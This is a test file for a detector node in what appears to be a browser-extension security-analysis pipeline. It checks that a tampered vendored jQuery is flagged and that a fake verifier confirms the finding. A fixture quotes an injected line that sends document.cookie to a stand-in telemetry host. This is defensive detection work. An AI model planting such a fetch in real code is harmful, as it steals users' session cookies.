import { describe, it, expect } from "vitest";
import { analyzeCorpus } from "../scripts/analyze-corpus.ts";
import { FakeLlmClient } from "../src/llm/fake.ts";
import { libraryTamperDeepDive } from "../src/methodologies/dag/nodes/library-tamper-deep-dive.ts";
import type { NodeContext } from "../src/methodologies/dag/node.ts";
import type { EvidencePack } from "../src/pipeline/schema.ts";

const results = analyzeCorpus("corpus", { analyzedAt: "2026-01-01T00:00:00Z" });
const packs = new Map(results.map((r) => [r.sample, r.pack]));
const pack = (s: string): EvidencePack => packs.get(s)!;

const SAMPLE = "mutant-b-tampered-lib";
const SAMPLE_DIR = `corpus/${SAMPLE}/extension`;

// Confirmed verdict for the injected fetch in the vendored jQuery (shape copied
// from methodology-dag.test.ts CONFIRMED_JSON).
const CONFIRMED_JSON = JSON.stringify({
  verdict: "confirmed",
  grounding_line: { file: "lib/jquery-3.3.1.min.js", line: 4 },
  rationale: "the injected fetch call exfiltrates document.cookie to the telemetry host",
  evidence_quote: 'fetch("https://cdn-jq-telemetry.invalid/p?d=" + document.cookie)',
});

function fakeClient(): FakeLlmClient {
  return new FakeLlmClient({
    "verify:claim": { text: CONFIRMED_JSON, usage: { inputTokens: 7, outputTokens: 3 } },
  });
}

function ctx(client: FakeLlmClient): NodeContext {
  return { pack: pack(SAMPLE), sampleDir: SAMPLE_DIR, upstream: new Map(), listing: null, enrichment: null, client, model: "test-model", verifierModel: "test-model" };
}

describe("library-tamper-deep-dive node", () => {
  it("fires on a vendored library carrying a network sink and confirms the tamper", async () => {
    const fake = fakeClient();
    const c = ctx(fake);

    expect(libraryTamperDeepDive.gate(c)).toBe(true);

    const result = await libraryTamperDeepDive.run(c);
    expect(result.status).toBe("ok");

    const tampered = result.findings.filter(
      (f) => f.category === "supply-chain" && f.evidence_refs.some((r) => r.file === "lib/jquery-3.3.1.min.js"),
    );
    expect(tampered.length).toBeGreaterThanOrEqual(1);

    // Regression guard: the claim must name the REAL injected host and cite the
    // sink on its line — not a jQuery-internal property like `t.url`, which a
    // rigorous verifier correctly refutes (the prior precision bug).
    const jq = tampered.find((f) => f.evidence_refs.some((r) => r.file === "lib/jquery-3.3.1.min.js"))!;
    expect(jq.claimed_mechanism).toContain("cdn-jq-telemetry.invalid");
    expect(jq.claimed_mechanism).not.toContain("t.url");
    expect(jq.evidence_refs[0]!.location?.line).toBe(4);

    expect(result.verdicts.some((v) => v.verdict === "confirmed")).toBe(true);

    // The verifier was actually consulted via the shared label.
    expect(fake.calls.some((cl) => cl.label === "verify:claim")).toBe(true);
  });

  it("does NOT fire on a vendored library with only a document.cookie sink and no network sink", () => {
    const minimalPack = {
      scripts: [
        {
          path: "lib/legit-lib.js",
          parsed_ok: true,
          sinks: [{ category: "storage", api: "document.cookie", location: { line: 12 }, snippet: "document.cookie" }],
          network_destinations: [],
          taint_sketches: [],
          listeners: [],
          obfuscation: null,
        },
      ],
    } as unknown as EvidencePack;

    const c: NodeContext = {
      pack: minimalPack,
      sampleDir: "corpus/none",
      upstream: new Map(),
      listing: null, enrichment: null,
      client: new FakeLlmClient({}),
      model: "test-model",
      verifierModel: "test-model",
    };

    expect(libraryTamperDeepDive.gate(c)).toBe(false);
  });
});
